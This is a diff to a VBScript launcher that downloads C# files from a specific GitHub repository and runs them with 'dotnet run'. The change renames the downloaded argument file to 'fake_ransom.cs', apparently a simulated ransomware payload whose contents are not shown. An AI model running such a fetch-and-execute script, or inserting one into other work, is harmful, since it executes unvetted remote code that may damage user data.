@@ -10,8 +10,8 @@ Set shell = CreateObject("WScript.Shell")
 Set fso   = CreateObject("Scripting.FileSystemObject")
 
 ' ---------- CONFIG ----------
-cfgUser   = "YOUR_GITHUB_USERNAME"
-cfgRepo   = "YOUR_REPO_NAME"
+cfgUser   = "asrafulshaheed-oss"
+cfgRepo   = "extra"
 cfgBranch = "main"
 ' ----------------------------
 
@@ -29,7 +29,7 @@ If rc <> 0 Then
 End If
 
 ' ---------- 1. Download ----------
-files = Array("auto.cs", "fake.cs")
+files = Array("auto.cs", "fake_ransom.cs")
 For Each f In files
     WScript.Echo "-> Downloading " & f & " ..."
     rc = shell.Run( _
@@ -66,7 +66,7 @@ End If
 ' ---------- 4. Run app ----------
 runCmd = """" & dotnetExe & """" & _
          " run --file " & """" & workDir & "\auto.cs" & """" & _
-         " -- " & """" & workDir & "\fake.cs" & """"
+         " -- " & """" & workDir & "\fake_ransom.cs" & """"
 
 WScript.Echo "-> Running: " & runCmd
 rc = shell.Run(runCmd, 1, True)
